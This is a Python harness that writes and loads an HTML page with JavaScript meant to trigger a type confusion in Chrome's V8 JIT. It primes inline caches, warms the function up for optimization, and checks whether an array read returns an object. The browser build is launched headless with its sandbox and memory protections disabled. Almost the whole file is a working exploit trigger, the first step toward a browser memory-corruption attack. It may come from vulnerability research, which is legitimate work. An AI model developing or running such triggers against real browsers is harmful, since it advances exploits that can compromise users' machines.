import subprocess, tempfile

html = """<!DOCTYPE html><html><body><script>
let lines = [];
lines.push("function sink_vuln(x, arr, obj) {");
for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
lines.push("  arr[0] = obj;");
lines.push("  let res = null;");
lines.push("  while ((res = arr[1]) !== null) {");
lines.push("    break;");
lines.push("  }");
lines.push("  return res;");
lines.push("}");
lines.push("return sink_vuln;");

let fn = new Function(lines.join("\\n"))();
let dummy = { a: 1 };

console.log("1. Priming IC transition with 50 double arrays...");
for (let i = 0; i < 50; i++) {
  fn(1000, [1.1, 2.2, 3.3], dummy);
}

console.log("2. Warming up invocation count (20000 iterations)...");
let dummy_arr = [1.1, 2.2, 3.3];
for (let i = 0; i < 20000; i++) {
  fn(i, dummy_arr, dummy);
}
console.log("3. Warmup complete! Scheduling check in 500ms...");

setTimeout(() => {
  let farr = [1.1, 2.2, 3.3];
  let res = fn(1000, farr, dummy);
  console.log("=== TEST RESULT: type=" + (typeof res) + " value=" + res + " ===");
  if (typeof res === "object") {
    console.log("🔥🔥🔥 SINKHOLE SUCCESS! Got object:", res, "🔥🔥🔥");
  } else {
    console.log("Still number:", res);
  }
}, 500);
</script></body></html>"""

with open("script/test_ic_then_tierup.html", "w") as f:
    f.write(html)

profile = tempfile.mkdtemp(prefix="prof-")
cmd = [
    "./script/candidate/chrome/chrome",
    "--headless=new",
    "--no-sandbox",
    "--disable-gpu",
    "--disable-dev-shm-usage",
    f"--user-data-dir={profile}",
    "--enable-logging=stderr",
    "--js-flags=--no-memory-protection-keys --expose-cage-base --trace-opt",
    "http://127.0.0.1:8000/test_ic_then_tierup.html"
]
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
try:
    out, _ = p.communicate(timeout=6)
except subprocess.TimeoutExpired:
    p.kill()
    out, _ = p.communicate()

for line in out.splitlines():
    if "sink_vuln" in line or "TEST RESULT" in line or "CONSOLE" in line or "SUCCESS" in line:
        print(line)
